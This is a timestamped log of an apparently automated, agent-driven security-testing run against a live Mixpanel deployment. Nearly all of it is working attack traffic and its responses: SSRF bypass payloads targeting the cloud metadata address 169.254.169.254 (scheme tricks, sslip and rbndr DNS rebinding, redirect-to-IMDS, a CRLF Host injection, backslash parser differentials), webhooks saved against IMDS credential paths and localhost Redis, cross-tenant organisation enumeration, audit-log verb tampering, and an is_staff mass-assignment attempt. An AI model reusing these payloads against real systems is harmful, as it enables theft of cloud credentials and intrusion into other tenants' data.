[18:49:41] ATTACK-SSRF-BYPASS: PROBE[uppercase-scheme] url=HTTP://169.254.169.254/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:49:44] ATTACK-SSRF-BYPASS: PROBE[mixed-scheme] url=HtTp://169.254.169.254/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:49:45] ATTACK-SSRF-BYPASS: PROBE[ftp-scheme] url=ftp://169.254.169.254/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 40
[18:49:47] ATTACK-SSRF-BYPASS: PROBE[https-imds] url=https://169.254.169.254/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:49:49] ATTACK-SSRF-BYPASS: PROBE[creds-imds] url=http://AKIA:secret@169.254.169.254/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:49:50] ATTACK-SSRF-BYPASS: PROBE[idn-mgi] url=http://xn--metadata-fya.google.internal/computeMetadata/v1/instance/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: c5
[18:49:51] ATTACK-SSRF-BYPASS: PROBE[nip-80] url=http://169-254-169-254.sslip.io/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:49:54] ATTACK-SSRF-BYPASS: PROBE[sslip] url=http://169.254.169.254.sslip.io/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[2026-05-30T18:49:55Z] RECON-ENDPOINTS:   GET /api/app/version -> 200 len=40 '79e74a6c6a00750d70ca63fa3f4fb9ff4bd33eec'
[18:49:56] ATTACK-SSRF-BYPASS: PROBE[oast-dns-only] url=http://imdsprobe-ea44d26c.9a80587a.x.example.com/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:49:57] ATTACK-SSRF-BYPASS: PROBE[oast-uniq-tag-1] url=https://webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/oast-uniq-e911c63a -> 200 body[200]={"status": "ok", "results": {"success": true, "status_code": 302, "message": "Webhook responded with status 302"}}
[18:49:59] ATTACK-SSRF-BYPASS: PROBE[oast-host-imds] url=http://169-254-169-254.9a80587a-10b4-4350-97b2-6121770760eb.webhook.site/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:49:59] ATTACK-SSRF-BYPASS: == CREATE webhook with IMDS URL (skipping test endpoint) ==
[18:50:03] ATTACK-SSRF-BYPASS: CREATE[create-imds-1] http://169.254.169.254/latest/meta-data/iam/security-credent -> 200 {"status": "ok", "results": {"id": "bbe9419f-1ee4-4840-8e81-273686ad2324", "name": "create-imds-1"}}
[18:50:03] ATTACK-SSRF-BYPASS:   CREATED wid=bbe9419f-1ee4-4840-8e81-273686ad2324
[18:50:05] ATTACK-SSRF-BYPASS: CREATE[create-meta-2] http://metadata.google.internal/computeMetadata/v1/instance/ -> 200 {"status": "ok", "results": {"id": "d9273fe2-2ff7-452b-8edf-1868291767eb", "name": "create-meta-2"}}
[18:50:05] ATTACK-SSRF-BYPASS:   CREATED wid=d9273fe2-2ff7-452b-8edf-1868291767eb
[18:50:06] ATTACK-SSRF-BYPASS: CREATE[create-localhost] http://127.0.0.1:6379/ -> 200 {"status": "ok", "results": {"id": "8c9338ac-35db-456d-a6a9-c1a737a9fe41", "name": "create-localhost"}}
[18:50:06] ATTACK-SSRF-BYPASS:   CREATED wid=8c9338ac-35db-456d-a6a9-c1a737a9fe41
[18:50:07] ATTACK-SSRF-BYPASS: CREATE[create-redir] https://httpbin.org/redirect-to?url=http://169.254.169.254/l -> 200 {"status": "ok", "results": {"id": "6b4b8a8f-0965-45f3-9264-07109996ab08", "name": "create-redir"}}
[18:50:07] ATTACK-SSRF-BYPASS:   CREATED wid=6b4b8a8f-0965-45f3-9264-07109996ab08
[18:50:10] ATTACK-SSRF-BYPASS: CREATE[create-rbndr] http://7f000001.a9fea9fe.rbndr.us/latest/meta-data/ -> 200 {"status": "ok", "results": {"id": "e9a1dc57-465a-41d8-8eb1-d82a0156f111", "name": "create-rbndr"}}
[18:50:10] ATTACK-SSRF-BYPASS:   CREATED wid=e9a1dc57-465a-41d8-8eb1-d82a0156f111
[18:50:10] ATTACK-SSRF-BYPASS: == READ-BACK created webhooks (to see if URLs were stored unfiltered) ==
[18:50:14] ATTACK-SSRF-BYPASS: LIST webhooks -> 200 {"status": "ok", "results": [{"id": "3b82f560-d587-4b8f-9c71-f35ae4d092c8", "name": "test", "url": "https://webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/test3", "is_enabled": true, "created": "2026-05-30T16:38:27.755", "modified": "2026-05-30T16:38:27.899", "creator_id": 6492622, "creator_name": "account mix  lastname"}, {"id": "bbe9419f-1ee4-4840-8e81-273686ad2324", "name": "create-imds-1", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "is_enabled": true, "cre
[18:50:14] ATTACK-SSRF-BYPASS: == CLEANUP: delete created webhooks ==
[18:50:17] ATTACK-SSRF-BYPASS: DELETE bbe9419f-1ee4-4840-8e81-273686ad2324 (create-imds-1) -> 200
[18:50:18] ATTACK-SSRF-BYPASS: DELETE d9273fe2-2ff7-452b-8edf-1868291767eb (create-meta-2) -> 200
[2026-05-30T18:50:18Z] RECON-ENDPOINTS:   GET /public/dashboard/ -> 200 len=9800 '<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta name="iframely" content="all'
[18:50:20] ATTACK-SSRF-BYPASS: DELETE 8c9338ac-35db-456d-a6a9-c1a737a9fe41 (create-localhost) -> 200
[18:50:22] ATTACK-SCIM: MGMT GET /api/app/security -> 404
[18:50:24] ATTACK-SSRF-BYPASS: DELETE 6b4b8a8f-0965-45f3-9264-07109996ab08 (create-redir) -> 200
[18:50:26] ATTACK-SSRF-BYPASS: DELETE e9a1dc57-465a-41d8-8eb1-d82a0156f111 (create-rbndr) -> 200
[18:50:26] ATTACK-SSRF-BYPASS: WROTE /home/hunter/new_agent/results/mixpanel/ssrf-bypass-v3-1780159826.json
[18:50:27] ATTACK-SCIM: MGMT GET /api/app/security/scim -> 404
[18:50:28] ATTACK-SCIM: MGMT GET /api/app/security/sso -> 404
[2026-05-30T18:50:29Z] RECON-ENDPOINTS:   STATUS COUNTS: {k: len(v) for k,v in by_status.items()}
[2026-05-30T18:50:29Z] RECON-ENDPOINTS:   emitted 25 endpoint_found events
[18:50:30] ATTACK-SCIM: MGMT GET /api/app/organizations -> 404
[2026-05-30T18:51:00Z] RECON-ENDPOINTS: STEP 6 COMPLETE — wrote RECON-ENDPOINTS-SUMMARY.md (92 lines)
[2026-05-30T18:51:00Z] RECON-ENDPOINTS: TOTALS — probed=314, live=18, auth_gated=4, 405=3, secrets=6 (all low-impact: 2 Sentry DSN, 1 Optimizely public ID, 1 Qualified public widget token)
[2026-05-30T18:51:00Z] RECON-ENDPOINTS: KEY DISCOVERIES:
[2026-05-30T18:51:00Z] RECON-ENDPOINTS:   - /api/app/version returns git commit hash 79e74a6c6a00750d70ca63fa3f4fb9ff4bd33eec (info leak — could fingerprint backend code)
[2026-05-30T18:51:00Z] RECON-ENDPOINTS:   - /api/app/scim/v2/ServiceProviderConfig is PUBLIC (200) — leaks SCIM provisioning config including supported features
[2026-05-30T18:51:00Z] RECON-ENDPOINTS:   - /api/app/scim/v2/{Users,Groups} expect Bearer auth (not Session) — separate token class
[2026-05-30T18:51:00Z] RECON-ENDPOINTS:   - /public/dashboard/ returns HTML — public-share endpoint, embed/share IDs are 22-char b64
[2026-05-30T18:51:00Z] RECON-ENDPOINTS:   - 405 on audit-logs (org+project) and integrations (project) — endpoints exist, need POST/PATCH/PUT for verb-tamper
[2026-05-30T18:51:00Z] RECON-ENDPOINTS:   - themes/workspaces gated by plan (403, not 404) — paid-tier endpoints exist
[2026-05-30T18:51:00Z] RECON-ENDPOINTS:   - NO GraphQL detected (all /graphql variants → 404 JSON)
[2026-05-30T18:51:00Z] RECON-ENDPOINTS:   - NO Swagger/OpenAPI exposed
[2026-05-30T18:51:00Z] RECON-ENDPOINTS:   - SPA shell at /project/<pid>/app/* is gated behind /request_access — couldn't extract real app JS bundles (only marketing-site Next.js)
[2026-05-30T18:51:00Z] RECON-ENDPOINTS: NEXT — recommend attack-idor on dashboards/cohorts/webhooks/bookmarks; verb-tamper on the 3 405s; SCIM bearer-token attack; public/dashboard/ enumeration if share IDs are predictable
[18:51:19] ATTACK-SSRF-BYPASS: == TRIGGER INVESTIGATION: explore webhook trigger surface ==
[18:51:21] ATTACK-SSRF-BYPASS: LIST initial -> 200 {"status": "ok", "results": [{"id": "3b82f560-d587-4b8f-9c71-f35ae4d092c8", "name": "test", "url": "https://webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/test3", "is_enabled": true, "created": "2026-05-30T16:38:27.755", "modified": "2026-05-30T16:38:27.899", "creator_id": 6492622, "creator_name": "account mix  lastname"}]}
[18:51:21] ATTACK-SSRF-BYPASS: == Cohort/Integration endpoint discovery ==
[18:51:21] ATTACK-SSRF-BYPASS:   GET /api/app/projects/4025923/cohort_integrations -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/cohort_integrations"}
[18:51:24] ATTACK-SSRF-BYPASS:   GET /api/app/projects/4025923/integrations -> 405 
[18:51:29] ATTACK-SSRF-BYPASS:   GET /api/app/projects/4025923/cohort_sync_integrations -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/cohort_sync_integrations"}
[18:51:31] ATTACK-SSRF-BYPASS:   GET /api/app/projects/4025923/cohort_syncs -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/cohort_syncs"}
[18:51:32] ATTACK-SSRF-BYPASS:   GET /api/2.0/cohorts/sync?project_id=4025923 -> 404 {"request": "/api/2.0/cohorts/sync?project_id=4025923", "error": "Invalid endpoint: sync"}
[18:51:32] ATTACK-SSRF-BYPASS:   GET /api/2.0/cohorts?project_id=4025923 -> 400 {"request": "/api/2.0/cohorts?project_id=4025923", "error": "Missing required parameter: params"}
[18:51:33] ATTACK-SSRF-BYPASS:   GET 923/webhooks/3b82f560-d587-4b8f-9c71-f35ae4d092c8/deliveries -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/3b82f560-d587-4b8f-9c71-f35ae4d092c8/deliveries"}
[18:51:33] ATTACK-SSRF-BYPASS:   GET s/4025923/webhooks/3b82f560-d587-4b8f-9c71-f35ae4d092c8/logs -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/3b82f560-d587-4b8f-9c71-f35ae4d092c8/logs"}
[18:51:35] ATTACK-SSRF-BYPASS:   GET ojects/4025923/webhooks/3b82f560-d587-4b8f-9c71-f35ae4d092c8 -> 405 
[18:51:37] ATTACK-SSRF-BYPASS:   GET s/4025923/webhooks/3b82f560-d587-4b8f-9c71-f35ae4d092c8/test -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/3b82f560-d587-4b8f-9c71-f35ae4d092c8/test"}
[18:51:37] ATTACK-SSRF-BYPASS: == Create OAST-tagged webhook with redirect-to-IMDS to test redirect-follow on fire ==
[18:51:40] ATTACK-SCIM: SA-HUNT /api/app/organizations/3100781/service-accounts -> 200

### RECON-ENDPOINTS FINAL (2026-05-30T19:15Z)
- 314 candidates probed → 18 live 200 + 4 auth/plan-gated + 3 verb-mismatch (405)
- /api/app/version → leaks git SHA 79e74a6c (info disclosure, low impact alone)
- /api/app/scim/v2/ServiceProviderConfig → PUBLIC no-auth (RFC-allowed; verify no extra leak)
- /api/app/scim/v2/{Users,Groups} → 401 "Only Bearer accepted" (separate auth class — session cookie rejected, need SCIM bearer)
- /public/dashboard/{22-char-base64} → public share-link endpoint (Task #13 target — enumeration test)
- 405 on /api/app/organizations/{oid}/audit-logs, /api/app/projects/{pid}/audit-logs, /api/app/projects/{pid}/integrations → verb-tamper candidates
- Live endpoints: dashboards, boards, bookmarks, cohorts, webhooks, custom_properties, users/import, playlists, experiments, feature-flags, metrics, annotations, behaviors
- NO GraphQL, NO Swagger
- Secrets: 6 hits — all public/low (Sentry DSN, Optimizely public ID, Qualified widget) — NO AWS/GCP/JWT keys
[18:51:43] ATTACK-SSRF-BYPASS: CREATE oast-trigger-d1b9d8196e14: 200 {"status": "ok", "results": {"id": "7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8", "name": "oast-trigger-d1b9d8196e14"}}
[18:51:46] ATTACK-SSRF-BYPASS: CREATE imds-redir-d1b9d8196e14: 200 {"status": "ok", "results": {"id": "eff1171e-6c4c-467b-a6dc-0b7d3bb2acc8", "name": "imds-redir-d1b9d8196e14"}}
[18:51:46] ATTACK-SSRF-BYPASS: == Post-save test endpoint discovery ==
[18:51:47] ATTACK-SCIM: SA-HUNT /api/2.0/service-accounts?organization_id=3100781 -> 400
[18:51:48] ATTACK-SCIM: SA-HUNT /api/2.0/serviceaccounts?organization_id=3100781 -> 400
[18:51:48] ATTACK-SSRF-BYPASS:   POST webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/test -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/test"}
[18:51:49] ATTACK-SSRF-BYPASS:   GET webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/test -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/test"}
[18:51:50] ATTACK-SCIM: SA-HUNT /api/2.0/service-accounts -> 400
[18:51:50] ATTACK-SSRF-BYPASS:   POST hooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/trigger -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/trigger"}
[18:51:51] ATTACK-SSRF-BYPASS:   GET hooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/trigger -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/trigger"}
[18:51:51] ATTACK-SSRF-BYPASS:   POST webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/fire -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/fire"}
[18:51:52] ATTACK-SSRF-BYPASS:   GET webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/fire -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/fire"}
[18:51:52] ATTACK-SSRF-BYPASS:   POST hooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/deliver -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/deliver"}
[18:51:52] ATTACK-SCIM: SA-HUNT /api/2.0/service_accounts -> 400
[18:51:53] ATTACK-SCIM: SA-HUNT /api/2.0/orgs/3100781/service-accounts -> 400
[18:51:54] ATTACK-SSRF-BYPASS:   GET hooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/deliver -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/deliver"}
[18:51:55] ATTACK-SSRF-BYPASS:   POST webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/send -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/send"}
[18:51:55] ATTACK-SSRF-BYPASS:   GET webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/send -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/send"}
[18:51:56] ATTACK-SSRF-BYPASS:   POST /webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/run -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/run"}
[18:51:57] ATTACK-SSRF-BYPASS:   GET /webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/run -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/run"}
[18:51:59] ATTACK-SSRF-BYPASS:   POST webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/ping -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/ping"}
[18:52:02] ATTACK-SSRF-BYPASS:   GET webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/ping -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/7be4bf2c-b871-40d9-a02f-b8bdd4a8b3d8/ping"}
[18:52:02] ATTACK-SSRF-BYPASS: == Cohort sync mechanism discovery ==
[18:52:03] ATTACK-SSRF-BYPASS:   GET /api/app/projects/4025923/cohorts -> 200 {"status": "ok", "results": []}
[18:52:05] ATTACK-SSRF-BYPASS:   GET /api/2.0/cohorts/list?project_id=4025923 -> 200 []
[18:52:08] ATTACK-SSRF-BYPASS:   GET /api/2.0/engage?project_id=4025923 -> 200 {"results": [], "page": 0, "session_id": "1780159817358-59eeef9397d72e7c3ab21bfbaa457b55", "page_size": 1000, "total": 0, "status": "ok", "computed_at": "2026-05-30T16:50:17.371692+00:00"}
[18:52:08] ATTACK-SSRF-BYPASS: == /webhooks/test with saved webhook IDs ==
[18:52:10] ATTACK-SSRF-BYPASS:   TEST body=['id'] wid=7be4bf2c -> 400 {"status": "error", "error": "root: Additional properties are not allowed (&#x27;id&#x27; was unexpected)&#x27;url&#x27; is a required property", "details": {"schema": {"additionalProperties": false, "description": "Payload for testing a webhook conn

### AUTHZ-AUDIT FINAL (2026-05-30) — CLEAN NEGATIVE
- 19 read + 4 write + 2 header probes saved to results/mixpanel/authz-1780159614.json
- Re-validation script: results/mixpanel/authz_revalidate.py
- Part A cross-project (4025962/4027263/4027269): MEMBER 302 /request_access/ — ENFORCED
- Part A 4025923 reads: 200 == ADMIN but legitimate (MEMBER granted "consumer" role + 5 project perms per /api/app/me)
- Part A 4025923 secret-class + all /api/app/organizations/* : 404 for BOTH roles — endpoints don't exist (route family wrong, inconclusive)
- Part B1 webhook create: 400 schema reject (cohort_id field not in schema)
- Part B2 PATCH /api/app/me {is_staff:true}: 400 schema reject for BOTH roles; is_staff:false verified pre+post on both accounts; len unchanged
- Part B3 invite user, B4 reset_api_key: 404 — endpoints don't exist
- Part C X-Mixpanel-Org-Role + X-Original-URL: both 302 /request_access/ — ignored
- All controls hold; mass-assignment protected at JSON-schema layer; session-derived identity used exclusively for authz
- Lead written: targets/mixpanel/leads/policy-gap-AUDIT-2026-05-30.md (confidence 0.00 — negative audit result)
[18:52:16] ATTACK-SSRF-BYPASS:   TEST body=['webhook_id'] wid=7be4bf2c -> 400 {"status": "error", "error": "root: Additional properties are not allowed (&#x27;webhook_id&#x27; was unexpected)&#x27;url&#x27; is a required property", "details": {"schema": {"additionalProperties": false, "description": "Payload for testing a webh
[18:52:17] ATTACK-SSRF-BYPASS:   TEST body=['url'] wid=7be4bf2c -> 200 {"status": "ok", "results": {"success": true, "status_code": 302, "message": "Webhook responded with status 302"}}
[18:52:20] ATTACK-SSRF-BYPASS:   TEST body=['id'] wid=eff1171e -> 400 {"status": "error", "error": "root: Additional properties are not allowed (&#x27;id&#x27; was unexpected)&#x27;url&#x27; is a required property", "details": {"schema": {"additionalProperties": false, "description": "Payload for testing a webhook conn
[18:52:21] ATTACK-SSRF-BYPASS:   TEST body=['webhook_id'] wid=eff1171e -> 400 {"status": "error", "error": "root: Additional properties are not allowed (&#x27;webhook_id&#x27; was unexpected)&#x27;url&#x27; is a required property", "details": {"schema": {"additionalProperties": false, "description": "Payload for testing a webh
[18:52:23] ATTACK-SSRF-BYPASS:   TEST body=['url'] wid=eff1171e -> 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:52:23] ATTACK-SSRF-BYPASS: == CLEANUP ==
[18:52:24] ATTACK-SSRF-BYPASS:   DELETE 7be4bf2c -> 200
[18:52:30] ATTACK-SSRF-BYPASS:   DELETE eff1171e -> 200
[18:52:30] ATTACK-SSRF-BYPASS: WROTE /home/hunter/new_agent/results/mixpanel/ssrf-bypass-trigger-1780159950.json
[18:53:12] ATTACK-SCIM: SA ADMIN-own GET org 3100781 -> 200 len=660
[18:53:13] ATTACK-SCIM: SA CROSS-TENANT ADMIN->IDOR_ORG GET 3100795 -> 403 len=61
[18:53:13] ATTACK-SCIM: SA CROSS-TENANT IDOR->ADMIN_ORG GET 3100781 -> 403
[18:53:15] ATTACK-SCIM: SA MEMBER GET 3100781 -> 200
[18:53:18] ATTACK-SCIM: SA ENUM org_id=3100780 -> 403
[18:53:18] ATTACK-SCIM: SA ENUM org_id=3100782 -> 403
[18:53:19] ATTACK-SCIM: SA ENUM org_id=3100790 -> 403
[18:53:19] ATTACK-SCIM: SA ENUM org_id=3100791 -> 403

### AUTHZ-AUDIT FINAL (2026-05-30T19:30Z) — CLEAN NEGATIVE + identity-map correction
**CORRECTED IDENTITY MAP:**
- MEMBER /api/app/me reveals **project-level grant**: project 4025923 = role "consumer" with perms [write_cohorts, write_custom_properties, write_lookup_tables, write_heat_maps, write_themes]
- So MEMBER's "no role" / 0 org-perms in org 3100781 does NOT mean zero access — they have explicit project-consumer grant on 4025923
- All previous "PRIVESC-MATCH" signals on 4025923 endpoints were legitimate consumer-level reads
- The vertical-privesc hypothesis on org 3100781 is invalidated — MEMBER is not actually a 0-perm user there

**ENDPOINT FAMILY REALITY:**
- /api/app/organizations/{oid}/* family **does NOT exist on this app surface** (all 404 for ADMIN and MEMBER both)
- Organization data flows exclusively through /api/app/me
- The 405 on /api/app/organizations/3100781/audit-logs that recon-endpoints flagged is the ONLY org-level endpoint that actually exists per recon — but probably specific to audit-logs only

**SETTLED NEGATIVES:**
- Cross-project reads (4025962, 4027263, 4027269): MEMBER → 302 (correctly enforced)
- PATCH /api/app/me {is_staff:true}: 400 schema reject for BOTH roles — field is not assignable
- Header context tricks (X-Mixpanel-Org-Role, X-Original-URL): silently ignored, never honored
- Cross-tenant attempts at project secrets / api-keys / users / info / settings: all 404 (route doesn't exist on this surface)

**NEXT FOCUS** based on these negatives:
- Audit log endpoint (405 on GET) — verb-tamper agent in flight
- Public dashboard token analysis — public-board agent in flight
- SCIM (separate auth class) — scim agent in flight
- Mixpanel Agent LLM cross-project access — llm agent in flight
- SSRF bypass extension (DNS rebinding, HTTP redirect) — bypass agent in flight
- File upload — rce agent in flight
[18:53:20] ATTACK-SCIM: SA ENUM org_id=3100795 -> 403
[18:53:21] ATTACK-SCIM: SA ENUM org_id=3100800 -> 403
[18:53:21] ATTACK-SCIM: SA ENUM org_id=1 -> 403
[18:53:22] ATTACK-SCIM: SA ENUM org_id=100 -> 404
[18:53:22] ATTACK-SCIM: SA ENUM org_id=1000 -> 404
[18:53:24] AUDIT-LOG: === PHASE A: Method enumeration as ADMIN ===
[18:53:25] ATTACK-SCIM: SA ENUM org_id=999999999 -> 404
[18:53:32] AUDIT-LOG: === PHASE A: Method enumeration as ADMIN ===
[18:53:33] AUDIT-LOG: A-HEAD | HEAD /api/app/organizations/3100781/audit-logs as ADMIN -> 405 | Allow=POST | CT=text/html; charset=utf-8 | body=
[18:53:34] AUDIT-LOG: A-OPTIONS | OPTIONS /api/app/organizations/3100781/audit-logs as ADMIN -> 405 | Allow=POST | CT=text/html; charset=utf-8 | body=
[18:53:34] AUDIT-LOG: A-POST-empty | POST /api/app/organizations/3100781/audit-logs as ADMIN -> -1 | Allow= | CT= | body=ERR:requests.api.request() got multiple values for keyword argument 'json'
[18:53:35] AUDIT-LOG: A-POST-range | POST /api/app/organizations/3100781/audit-logs as ADMIN -> -1 | Allow= | CT= | body=ERR:requests.api.request() got multiple values for keyword argument 'json'
[18:53:36] AUDIT-LOG: A-PUT | PUT /api/app/organizations/3100781/audit-logs as ADMIN -> -1 | Allow= | CT= | body=ERR:requests.api.request() got multiple values for keyword argument 'json'
[18:53:38] AUDIT-LOG: A-PATCH | PATCH /api/app/organizations/3100781/audit-logs as ADMIN -> -1 | Allow= | CT= | body=ERR:requests.api.request() got multiple values for keyword argument 'json'
[18:53:40] ATTACK-SSRF-BYPASS: == STEP A: pull webhook.site request log to understand fetcher behavior ==
[18:53:40] ATTACK-SSRF-BYPASS: webhook.site requests count=10
[18:53:40] ATTACK-SSRF-BYPASS:   HIT: method=POST url=80587a-10b4-4350-97b2-6121770760eb/trigger-test-d1b9d8196e14 ua=python-requests/2.32.2 body={"test": true, "message": "This is a test notification from Mixpanel", "webhook_name": "Test Webhook", "project_name": "
[18:53:40] ATTACK-SSRF-BYPASS:   HIT: method=POST url=site/9a80587a-10b4-4350-97b2-6121770760eb/oast-uniq-e911c63a ua=python-requests/2.32.2 body={"test": true, "message": "This is a test notification from Mixpanel", "webhook_name": "Test Webhook", "project_name": "
[18:53:40] ATTACK-SSRF-BYPASS:   HIT: method=POST url=tp://webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/ws-bs ua=python-requests/2.32.2 body={"test": true, "message": "This is a test notification from Mixpanel", "webhook_name": "Test Webhook", "project_name": "
[18:53:40] ATTACK-SSRF-BYPASS:   HIT: method=GET url=ite/9a80587a-10b4-4350-97b2-6121770760eb/redir-public-target ua=python-requests/2.32.2 body=
[18:53:40] ATTACK-SSRF-BYPASS:   HIT: method=GET url=ook.site/9a80587a-10b4-4350-97b2-6121770760eb/redir-followed ua=python-requests/2.32.2 body=
[18:53:40] ATTACK-SSRF-BYPASS:   HIT: method=POST url=te/9a80587a-10b4-4350-97b2-6121770760eb/baseline-v2-873c27b0 ua=python-requests/2.32.2 body={"test": true, "message": "This is a test notification from Mixpanel", "webhook_name": "Test Webhook", "project_name": "
[18:53:40] ATTACK-SSRF-BYPASS:   HIT: method=POST url=0b4-4350-97b2-6121770760eb/crlf%0D%0AHost:%20169.254.169.254 ua=python-requests/2.32.2 body={"test": true, "message": "This is a test notification from Mixpanel", "webhook_name": "probe-crlf", "project_name": "pr
[18:53:40] ATTACK-SSRF-BYPASS:   HIT: method=POST url=hook.site/9a80587a-10b4-4350-97b2-6121770760eb/userinfo-test ua=python-requests/2.32.2 body={"test": true, "message": "This is a test notification from Mixpanel", "webhook_name": "probe-userinfo-mix", "project_na
[18:53:40] ATTACK-SSRF-BYPASS:   HIT: method=POST url=k.site/9a80587a-10b4-4350-97b2-6121770760eb/aws-imds-attempt ua=python-requests/2.32.2 body={"test": true, "message": "This is a test notification from Mixpanel", "webhook_name": "probe-oast-aws-tag", "project_na
[18:53:40] ATTACK-SSRF-BYPASS:   HIT: method=POST url=//webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/baseline ua=python-requests/2.32.2 body={"test": true, "message": "This is a test notification from Mixpanel", "webhook_name": "probe-baseline", "project_name":
[18:53:40] ATTACK-SSRF-BYPASS: == STEP B: parser-differential bypasses (WHATWG vs RFC3986) ==
[18:53:40] AUDIT-LOG: A-GET-qs | GET /api/app/organizations/3100781/audit-logs?start_date=2026-05-01&end_date=2026-05-30&limit=10&page=1 as ADMIN -> 405 | Allow=POST | CT=text/html; charset=utf-8 | body=
[18:53:42] AUDIT-LOG: A-HEAD | HEAD /api/app/projects/4025923/audit-logs as ADMIN -> 405 | Allow=POST | CT=text/html; charset=utf-8 | body=
[18:53:42] AUDIT-LOG: A-OPTIONS | OPTIONS /api/app/projects/4025923/audit-logs as ADMIN -> 405 | Allow=POST | CT=text/html; charset=utf-8 | body=
[18:53:44] ATTACK-SSRF-BYPASS: PROBE[pd-bs-at-1] url=http://webhook.site\@169.254.169.254/latest/meta-data/ -> 400 {"status": "error", "error": "url: &#x27;http://webhook.site\\\\@169.254.169.254/latest/meta-data/&#x27; is not a &#x27;uri&#x27;", "details": {"schema": {"format": "uri", "maxLength": 2083, "minLengt
[18:53:45] AUDIT-LOG: A-POST-empty | POST /api/app/projects/4025923/audit-logs as ADMIN -> -1 | Allow= | CT= | body=ERR:requests.api.request() got multiple values for keyword argument 'json'
[18:53:46] ATTACK-SSRF-BYPASS: PROBE[pd-bs-at-enc1] url=http://webhook.site%5C@169.254.169.254/latest/meta-data/ -> 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:53:46] AUDIT-LOG: A-POST-range | POST /api/app/projects/4025923/audit-logs as ADMIN -> -1 | Allow= | CT= | body=ERR:requests.api.request() got multiple values for keyword argument 'json'
[18:53:47] AUDIT-LOG: A-PUT | PUT /api/app/projects/4025923/audit-logs as ADMIN -> -1 | Allow= | CT= | body=ERR:requests.api.request() got multiple values for keyword argument 'json'
[18:53:47] ATTACK-SSRF-BYPASS: PROBE[pd-bs-at-enc2] url=http://webhook.site%5c@169.254.169.254/latest/meta-data/ -> 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:53:47] AUDIT-LOG: A-PATCH | PATCH /api/app/projects/4025923/audit-logs as ADMIN -> -1 | Allow= | CT= | body=ERR:requests.api.request() got multiple values for keyword argument 'json'
